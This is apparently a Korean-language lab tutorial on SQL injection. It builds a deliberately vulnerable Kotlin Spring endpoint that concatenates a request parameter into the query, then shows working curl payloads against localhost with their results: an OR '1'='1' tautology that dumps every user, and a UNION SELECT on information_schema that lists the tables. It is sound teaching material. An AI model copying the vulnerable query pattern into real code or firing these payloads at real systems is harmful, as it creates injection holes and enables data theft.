# SQL Injection 실습

## SQL Injection 취약 API 작성

``` kotlin
@RestController
class UserController(
    private val connection: Connection
) {

    /**
     * SQL Injection 취약 API
     */
    @GetMapping("/users")
    fun getUsers(@RequestParam id: String): List<Map<String, Any?>> {
        // 고의로 PreparedStatement를 사용하지 않음 (Injection 실습용)
        val sql = "SELECT * FROM users WHERE id = '$id'"  // <-- 취약
        
        println("sql = ${sql}") // 실행되는 SQL 확인
        val stmt = connection.createStatement()
        val rs = stmt.executeQuery(sql)

        val response = mutableListOf<Map<String, Any?>>()
        while (rs.next()) {
            val data = mutableMapOf<String, Any?>()
            data["id"] = rs.getString(1)
            data["username"] = rs.getString(2)
            response.add(data)
        }
        return response
    }
}
```

## 샘플 데이터 준비

### schema.sql

```sql
drop table if exists users cascade;
drop table if exists point cascade;

create table users
(
  id         bigint       not null comment 'PK'
    primary key auto_increment,
  username   varchar(255) not null comment '이름',
  created_at timestamp(6) not null comment '생성 시점',
  updated_at timestamp(6) not null comment '마지막 수정 시점'
)
  comment '유저';

create table point
(
  id      bigint auto_increment primary key,
  user_id bigint not null,
  balance int    not null,
  version bigint not null
)
  comment '포인트';
```

### data.sql

```sql
INSERT INTO users (username, created_at, updated_at)
VALUES ('user1', current_timestamp, current_timestamp),
       ('user2', current_timestamp, current_timestamp),
       ('user3', current_timestamp, current_timestamp),
       ('user4', current_timestamp, current_timestamp);
```

## SQL Injection 공격 실습

### 모든 사용자 정보 조회

#### 공격 코드

```shell
curl -s "http://localhost:8080/users?id=1'%20OR%20'1'='1" | python3 -m json.tool
```

#### 결과

```
[
    {
        "id": "1",
        "username": "user1"
    },
    {
        "id": "2",
        "username": "user2"
    },
    {
        "id": "3",
        "username": "user3"
    },
    {
        "id": "4",
        "username": "user4"
    }
]
```

#### 서버에서 실행된 SQL

```sql
SELECT *
FROM users
WHERE id = '1'
   OR '1' = '1'
```

### 현재 스키마의 모든 테이블 목록 조회

#### 공격 코드

```shell
curl -s "http://localhost:8080/users?id=1%27%20UNION%20SELECT%20null,%20table_name,%20null,%20null%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20DATABASE()%20--%20" | python3 -m json.tool
```

#### 결과

```json
[
  {
    "id": "1",
    "username": "user1"
  },
  {
    "id": null,
    "username": "point"
  },
  {
    "id": null,
    "username": "users"
  }
]
```

#### 서버에서 실행된 SQL

```sql
SELECT *
FROM users
WHERE id = '1'
UNION
SELECT null, table_name, null, null
FROM information_schema.tables
WHERE table_schema = DATABASE() -- '
```

